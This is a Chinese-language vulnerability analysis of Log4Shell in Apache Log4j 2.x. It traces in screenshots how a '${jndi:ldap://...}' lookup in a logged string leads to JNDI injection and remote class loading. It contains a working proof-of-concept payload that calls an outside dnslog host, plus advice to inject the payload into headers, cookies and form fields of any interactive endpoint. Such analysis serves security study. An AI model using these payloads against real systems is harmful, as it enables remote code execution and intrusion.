# 0x01、环境

Jdk7u21（随便版本都可以）

影响版本：Apache Log4j 2.x <= 2.14.1

**已知受影响应用及组件：**

Apache Solr

Apache Flink

Apache Druid

srping-boot-strater-log4j2

log4j坐标

```xml
<dependency>
   <groupId>org.apache.logging.log4j</groupId>
   <artifactId>log4j-core</artifactId>
   <version>2.11.1</version>
</dependency>
```



Poc

```java
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;




public class test2 {
    private static Logger LOGGER = LogManager.getLogger();

    public static void main(String[] args) {
        LOGGER.error("${jndi:ldap://ewa04i.dnslog.cn/}");
    }
}
```



# 0x02、分析



看payload，我们无可厚非去搜索log4j lookup或者log4j jndi

https://logging.apache.org/log4j/2.x/manual/lookups.html【英文文档】

https://www.docs4dev.com/docs/zh/log4j2/2.x/all/manual-lookups.html【中文文档】

![](https://img2020.cnblogs.com/blog/2099765/202112/2099765-20211210110132927-48855865.png)

我们可以看到使用方法，不难发现这边支持jndi，而jndi又支持其他协议，会进行转换，不难想起ldap；我们调试下看看。因为我昨天半夜调试了下，到五点半，早上还有课，我就去睡觉了，只保存了分析过程的截图

![](https://img2020.cnblogs.com/blog/2099765/202112/2099765-20211210110648048-1233048434.png)

废话不多说，往下看；因为我昨晚调试了挺多遍的，所以这边我就直接下到关键地方

![](https://img2020.cnblogs.com/blog/2099765/202112/2099765-20211210110928515-1896628393.png)

直接到关键点：`org.apache.logging.log4j.core.layout.PatternLayout.PatternSerializer#toSerializable(org.apache.logging.log4j.core.LogEvent, java.lang.StringBuilder)`



![](https://img2020.cnblogs.com/blog/2099765/202112/2099765-20211210111215291-2114617939.png)
![](https://img2020.cnblogs.com/blog/2099765/202112/2099765-20211210111238971-1771828336.png)
![](https://img2020.cnblogs.com/blog/2099765/202112/2099765-20211210111254790-460135041.png)
![](https://img2020.cnblogs.com/blog/2099765/202112/2099765-20211210111329190-10197825.png)
![](https://img2020.cnblogs.com/blog/2099765/202112/2099765-20211210111347598-1239469173.png)
![](https://img2020.cnblogs.com/blog/2099765/202112/2099765-20211210111404701-969273519.png)
![](https://img2020.cnblogs.com/blog/2099765/202112/2099765-20211210111418282-466377299.png)
![](https://img2020.cnblogs.com/blog/2099765/202112/2099765-20211210111437282-1882156478.png)

`org.apache.logging.log4j.core.pattern.PatternFormatter#format`

![](https://img2020.cnblogs.com/blog/2099765/202112/2099765-20211210111806082-1323983633.png)

我们跟进查看该方法，在java原生中该方法是格式化字符串，不知道这边是不是

`org.apache.logging.log4j.core.pattern.MessagePatternConverter#format`

![](https://img2020.cnblogs.com/blog/2099765/202112/2099765-20211210112017657-180908802.png)

这边通过getMessage()获取到了我们的payload，为啥呢？

![](https://img2020.cnblogs.com/blog/2099765/202112/2099765-20211210112220836-877610622.png)

![](https://img2020.cnblogs.com/blog/2099765/202112/2099765-20211210112305795-1606485861.png)

这边就不继续累赘了；我们继续往下看

`org.apache.logging.log4j.core.pattern.MessagePatternConverter#format`

可以看到这边是会检测是否为`${`开头，如果是，则进行执行，触发漏洞点

![](https://img2020.cnblogs.com/blog/2099765/202112/2099765-20211210112548145-1787924791.png)

![](https://img2020.cnblogs.com/blog/2099765/202112/2099765-20211210112734621-265931502.png)

![](https://img2020.cnblogs.com/blog/2099765/202112/2099765-20211210112928533-337236284.png)

该方法文档可以看这里https://logging.apache.org/log4j/2.x/log4j-core/apidocs/org/apache/logging/log4j/core/lookup/StrSubstitutor.html

![](https://img2020.cnblogs.com/blog/2099765/202112/2099765-20211210113204629-1627459557.png)

![](https://img2020.cnblogs.com/blog/2099765/202112/2099765-20211210113337343-1475742465.png)

![](https://img2020.cnblogs.com/blog/2099765/202112/2099765-20211210113418522-1605966248.png)

![](https://img2020.cnblogs.com/blog/2099765/202112/2099765-20211210114211248-752607585.png)

![](https://img2020.cnblogs.com/blog/2099765/202112/2099765-20211210114304550-107522597.png)

![](https://img2020.cnblogs.com/blog/2099765/202112/2099765-20211210114401197-363818455.png)好像其实看文档就差不多了，这边的话是获取变量解析器

![](https://img2020.cnblogs.com/blog/2099765/202112/2099765-20211210114741212-322435885.png)

![](https://img2020.cnblogs.com/blog/2099765/202112/2099765-20211210115217414-1301698122.png)

![](https://img2020.cnblogs.com/blog/2099765/202112/2099765-20211210115236254-84496283.png)

随即进入**org.apache.logging.log4j.core.lookup.Interpolator#lookup**

![](https://img2020.cnblogs.com/blog/2099765/202112/2099765-20211210115545302-282909187.png)

获取对应的前缀，选择对应的jndi类对象-JndiLookup

![](https://img2020.cnblogs.com/blog/2099765/202112/2099765-20211210120137676-1255175908.png)

![](https://img2020.cnblogs.com/blog/2099765/202112/2099765-20211210120404080-1305589816.png)

从而进行jndi注入，达到远程类加载的目的；


# 0x03、复现
![image](https://user-images.githubusercontent.com/81064151/145669301-2a9fddae-fd11-435e-8cc3-a86e047044c5.png)

1、jndi位于服务器，让目标请求服务器的class文件
2、需要注意log4j漏洞触发点为日志所记录的地方；如可能被log4j所记录的地方
如http请求头，cookie，登录框，get传参，post传参等

# 0x04、总结



![](https://img2020.cnblogs.com/blog/2099765/202112/2099765-20211210113204629-1627459557.png)

查看官方文档，其实就是通过格式化，对`${jndi:ldap://uci5xf.dnslog.cn/test}`进行替换为真实的数据；

![](https://img2020.cnblogs.com/blog/2099765/202112/2099765-20211210121553925-1572233868.png)

参考文章:https://blog.csdn.net/lqzkcx3/article/details/82050375
log4j又用lookup去进行一个协议的获取，获取到该协议是jndi，data，sys等等。而里面是map形式存储；检测对应的key，获取到对应的lookup并执行。形成个标准jndi注入漏洞；



从入口看的话，不难发现，只要是被日志记录，即可执行（有部分不可以）因为临时写的，就不深究；

打它的方式就是：有交互的地方都打个遍，嘎嘎嘎
